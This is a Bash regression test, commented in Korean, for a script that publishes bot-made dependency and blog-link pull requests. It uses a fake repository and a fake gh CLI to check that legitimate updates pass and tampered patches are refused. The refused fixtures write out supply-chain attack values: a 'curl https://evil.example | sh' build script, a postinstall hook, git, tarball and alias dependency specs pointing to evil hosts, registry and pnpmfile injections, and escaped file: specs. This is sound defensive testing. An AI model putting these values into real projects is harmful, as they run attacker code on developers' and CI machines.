#!/usr/bin/env bash
# publish-bot-pr.sh 회귀 테스트(CI는 부르지 않는다). VERBOSE=1이면 통과한 것의 로그도 찍는다.
# 가짜 저장소·원격·gh로 시나리오마다 패치를 넘긴다. 필요한 것: bash, git, jq, perl.
set -euo pipefail

script="$(cd "$(dirname "$0")" && pwd)/publish-bot-pr.sh"
root="$(mktemp -d "${TMPDIR:-/tmp}/publish-bot-pr-test.XXXXXX")"
trap 'rm -rf -- "$root"' EXIT

export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
export GIT_AUTHOR_NAME=test GIT_AUTHOR_EMAIL=test@example.com
export GIT_COMMITTER_NAME=test GIT_COMMITTER_EMAIL=test@example.com

# 가짜 gh: 호출을 기록하고 `pr list`는 FAKE_PRS를 --author로 거른 뒤 --jq를 적용한다.
mkdir -p "$root/bin" "$root/runner"
cat >"$root/bin/gh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$*" >>"$GH_LOG"
case "$1 $2" in
  "pr list")
    expr='.'
    author=''
    while (($#)); do
      case "$1" in
        --jq) expr="$2" ;;
        --author) author="$2" ;;
      esac
      shift
    done
    jq --arg author "$author" '[.[] | select($author == "" or .author.login == $author)]' \
      <<<"${FAKE_PRS:-[]}" | jq -r "$expr"
    ;;
  "pr create") echo "https://github.com/owner/repo/pull/1" ;;
esac
EOF
chmod +x "$root/bin/gh"
export PATH="$root/bin:$PATH" RUNNER_TEMP="$root/runner"

seed="$root/seed"
mkdir -p "$seed/packages/x" "$seed/apps/blog/posts" "$seed/.github/workflows"
cat >"$seed/package.json" <<'EOF'
{
  "name": "fixture",
  "private": true,
  "scripts": {
    "build": "turbo run build"
  },
  "devDependencies": {
    "prettier": "^3.9.0"
  },
  "packageManager": "pnpm@12.4.2"
}
EOF
cat >"$seed/packages/x/package.json" <<'EOF'
{
  "name": "x",
  "version": "1.0.0",
  "dependencies": {
    "mermaid": "^11.1.0",
    "react": "catalog:"
  },
  "devDependencies": {
    "vitest": "catalog:"
  }
}
EOF
cat >"$seed/pnpm-workspace.yaml" <<'EOF'
packages:
  - 'packages/*'

overrides:
  # 기존 오버라이드
  postcss: 8.5.28

allowBuilds:
  esbuild: true
  msw: false

catalog:
  react: 19.3.0
  vitest: ^5.0.1
EOF
cat >"$seed/pnpm-lock.yaml" <<'EOF'
lockfileVersion: '9.0'

settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false

overrides:
  postcss: 8.5.28

importers:

  packages/x:
    dependencies:
      mermaid:
        specifier: ^11.1.0
        version: 11.1.0
      react:
        specifier: 'catalog:'
        version: 19.3.0

packages:

  mermaid@11.1.0:
    resolution: {integrity: sha512-AAAA}

  react@19.3.0:
    resolution: {integrity: sha512-BBBB}
    engines: {node: '>=0.10.0'}

  vfile@6.0.3:
    resolution: {integrity: sha512-CCCC}

snapshots:

  mermaid@11.1.0:
    dependencies:
      vfile: 6.0.3

  react@19.3.0: {}

  vfile@6.0.3: {}
EOF
printf -- '---\nstatus: published\n---\n\n[링크](https://old.example.com/a)\n' >"$seed/apps/blog/posts/a.md"
printf 'name: CI\n' >"$seed/.github/workflows/ci.yml"
git -C "$seed" init -q
git -C "$seed" add -A
git -C "$seed" commit -q -m init
git -C "$seed" branch -M main
git clone -q --bare "$seed" "$root/remote.git"

# $1 파일의 리터럴 $2를 $3으로 바꾼다. 못 찾으면 멈춘다.
edit() {
  FROM="$2" TO="$3" perl -0pi -e 's/\Q$ENV{FROM}\E/$ENV{TO}/ or die "찾지 못함: $ENV{FROM}\n"' "$1"
}

DEPS='^(package\.json|pnpm-workspace\.yaml|pnpm-lock\.yaml|(apps|packages)/[^/]+(/[^/]+)*/package\.json)$'
POSTS='^apps/blog/posts/.+\.mdx?$'

pass=0
fail=0
run=0
# $1 이름, $2 기대, $3 허용 경로 정규식, $4 작업 트리를 바꾸는 함수, $5… 스크립트에 줄 환경.
# accept: 새 PR · reject: ::error::로 실패, 원격·작업 트리 그대로 · comment: 봇 PR #7에 코멘트만
scenario() {
  local name="$1" expect="$2" allowed="$3" mutate="$4"
  local work="$root/work-$name" out="$root/out-$name" log="$root/$name.log"
  local rc=0 refs_before refs_after pushed=no dirty ok=no
  export GH_LOG="$root/gh-$name.log"
  : >"$GH_LOG"
  run=$((run + 1))
  git clone -q "$root/remote.git" "$work"
  mkdir -p "$out"
  # `&&`로 잇지 않는다 — 그 안에서는 set -e가 꺼져 edit 실패가 묻힌다.
  (
    cd "$work"
    "$mutate"
    git diff --binary HEAD >"$out/bot.patch"
    git checkout -q -- .
  )
  printf 'chore(deps): 테스트 %s\n' "$name" >"$out/bot-title.txt"
  printf '본문\n' >"$out/bot-body.md"
  printf '이번 점검 요약\n' >"$out/bot-comment.md"

  refs_before="$(git --git-dir="$root/remote.git" for-each-ref --format='%(refname)')"
  (
    cd "$work"
    env OUT_DIR="$out" NAME=bot BRANCH_PREFIX=claude/bot- ALLOWED_PATHS="$allowed" \
      DEFAULT_TITLE='기본 제목' CI_WORKFLOW=ci.yml GITHUB_RUN_NUMBER="$run" "${@:5}" \
      bash "$script"
  ) >"$log" 2>&1 || rc=$?
  refs_after="$(git --git-dir="$root/remote.git" for-each-ref --format='%(refname)')"
  [[ "$refs_before" == "$refs_after" ]] || pushed=yes
  dirty="$(git -C "$work" status --porcelain)"

  case "$expect" in
    accept) [[ $rc -eq 0 && $pushed == yes ]] && ! grep -q '^pr comment' "$GH_LOG" && ok=yes ;;
    reject) [[ $rc -ne 0 && $pushed == no && -z "$dirty" ]] && grep -q '::error::' "$log" && ok=yes ;;
    comment) [[ $rc -eq 0 && $pushed == no ]] && grep -q '^pr comment 7 ' "$GH_LOG" && ok=yes ;;
  esac
  if [[ $ok == yes ]]; then
    pass=$((pass + 1))
    printf 'ok    %-26s %s (rc=%d)\n' "$name" "$expect" "$rc"
    if [[ -n "${VERBOSE:-}" ]]; then sed 's/^/      | /' "$log"; fi
  else
    fail=$((fail + 1))
    printf 'FAIL  %-26s 기대 %s, rc=%d pushed=%s dirty=%s\n' "$name" "$expect" "$rc" "$pushed" "${dirty:+yes}"
    sed 's/^/      | /' "$log"
  fi
}

# 받아야 하는 변경: 범위 승급, lockfile 재해석(`vfile:` 키, URL이 든 deprecated), override·catalog
# 승급(advisory URL 주석 포함), auditConfig 예외 추가, 글의 링크 교체.
legit_deps() {
  edit packages/x/package.json '"mermaid": "^11.1.0"' '"mermaid": "^11.4.1"'
  edit pnpm-lock.yaml $'specifier: ^11.1.0\n        version: 11.1.0' $'specifier: ^11.4.1\n        version: 11.4.1'
  edit pnpm-lock.yaml $'  mermaid@11.1.0:\n    resolution: {integrity: sha512-AAAA}' \
    $'  mermaid@11.4.1:\n    resolution: {integrity: sha512-DDDD}\n    deprecated: see https://example.com/why'
  edit pnpm-lock.yaml $'  mermaid@11.1.0:\n    dependencies:\n      vfile: 6.0.3' \
    $'  mermaid@11.4.1:\n    dependencies:\n      vfile: 6.0.4'
  edit pnpm-lock.yaml $'  vfile@6.0.3:\n    resolution' $'  vfile@6.0.4:\n    resolution'
  edit pnpm-lock.yaml '  vfile@6.0.3: {}' '  vfile@6.0.4: {}'
  edit pnpm-lock.yaml $'overrides:\n  postcss: 8.5.28' $'overrides:\n  postcss: 8.5.30'
  edit pnpm-workspace.yaml '  postcss: 8.5.28' \
    $'  postcss: 8.5.30\n  # GHSA-r5fr-rjxr-66jc: https://github.com/advisories/GHSA-r5fr-rjxr-66jc\n  lodash-es: 4.18.1'
  edit pnpm-workspace.yaml '  react: 19.3.0' '  react: 19.3.1'
  printf '\nauditConfig:\n  ignoreGhsas:\n    - GHSA-aaaa-bbbb-cccc\n' >>pnpm-workspace.yaml
}
scenario legit-deps accept "$DEPS" legit_deps

legit_post() { edit apps/blog/posts/a.md 'https://old.example.com/a' 'https://web.archive.org/web/https://old.example.com/a'; }
scenario legit-post accept "$POSTS" legit_post

# 봇이 이 저장소 브랜치로 연 PR에만 코멘트하고, 같은 접두어의 포크·사람 PR은 무시한다.
scenario existing-bot-pr comment "$POSTS" legit_post \
  FAKE_PRS='[{"number":7,"headRefName":"claude/bot-20260901-3","isCrossRepository":false,"author":{"login":"app/github-actions"}}]'
scenario other-prs-same-prefix accept "$POSTS" legit_post \
  FAKE_PRS='[{"number":8,"headRefName":"claude/bot-evil","isCrossRepository":true,"author":{"login":"mallory"}},{"number":9,"headRefName":"claude/bot-manual","isCrossRepository":false,"author":{"login":"someone"}}]'

# 거부해야 하는 변경: $1 이름, $2 파일, $3 찾을 문자열, $4 바꿀 문자열, $5 허용 경로(기본 DEPS)
apply_edit() { edit "$FILE" "$FROM" "$TO"; }
reject_edit() {
  FILE=$2 FROM=$3 TO=$4
  scenario "$1" reject "${5:-$DEPS}" apply_edit
}
X=packages/x/package.json
reject_edit workflow-path .github/workflows/ci.yml 'name: CI' $'name: CI\non: push' "$POSTS"
reject_edit pkg-postinstall "$X" '"version": "1.0.0",' $'"version": "1.0.0",\n  "scripts": { "postinstall": "node evil.js" },'
reject_edit pkg-root-script package.json '"build": "turbo run build"' '"build": "curl https://evil.example | sh"'
reject_edit pkg-new-dependency "$X" '"react": "catalog:"' $'"react": "catalog:",\n    "turbo-bin": "^1.0.0"'
reject_edit pkg-git-spec "$X" '"^11.1.0"' '"github:evil/mermaid"'
reject_edit pkg-github-shorthand "$X" '"^11.1.0"' '"evil/mermaid#main"'
reject_edit pkg-tarball-url "$X" '"^11.1.0"' '"https://evil.example/m.tgz"'
reject_edit pkg-directory-spec "$X" '"^11.1.0"' '".."'
reject_edit pkg-local-tarball "$X" '"^11.1.0"' '"11.1.0.tgz"'
reject_edit pkg-npm-alias "$X" '"^11.1.0"' '"npm:evil-mermaid@11.1.0"'
reject_edit pkg-json-escape "$X" '"^11.1.0"' $'"\x5cu0066ile:../evil"' # JSON 이스케이프로 숨긴 file:
reject_edit lock-tarball pnpm-lock.yaml '{integrity: sha512-AAAA}' '{tarball: https://evil.example/m.tgz}'
reject_edit lock-git pnpm-lock.yaml '{integrity: sha512-AAAA}' '{commit: 0123abc, repo: git@github.com:evil/m.git, type: git}'
reject_edit ws-pnpmfile-in-overrides pnpm-workspace.yaml '  postcss: 8.5.28' $'  postcss: 8.5.28\npnpmfile: .pnpmfile.cjs'
reject_edit ws-registry pnpm-workspace.yaml '  vitest: ^5.0.1' $'  vitest: ^5.0.1\nregistry: https://evil.example/'
reject_edit ws-allow-builds pnpm-workspace.yaml 'msw: false' 'msw: true'
reject_edit ws-override-file pnpm-workspace.yaml '  postcss: 8.5.28' '  postcss: file:../evil'
reject_edit ws-yaml-escape pnpm-workspace.yaml '  postcss: 8.5.28' '  postcss: "\x66ile:../evil"'
reject_edit ws-catalog-link pnpm-workspace.yaml '  react: 19.3.0' '  react: link:../evil'

echo
echo "통과 $pass · 실패 $fail"
((fail == 0))
